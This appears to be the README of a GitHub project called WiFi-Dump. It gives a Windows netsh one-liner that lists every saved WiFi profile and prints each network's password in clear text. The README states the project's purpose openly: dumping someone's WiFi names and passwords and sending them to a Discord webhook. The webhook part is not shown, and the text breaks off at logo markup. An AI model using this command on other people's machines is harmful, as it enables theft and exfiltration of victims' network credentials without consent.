# WiFi-Dump

```bash
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ " " (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") & echo.
```

## Dump someones WiFi SSID and Passwords and send them all to a Discord Webhook

<!-- PROJECT LOGO -->
<br />
<p align="center">
  <a href="https://github.com/hackitwithseo/WiFi-Dump/">
    <img src="./logo.png" alt="Logo" width="380" height="375">
  </a>
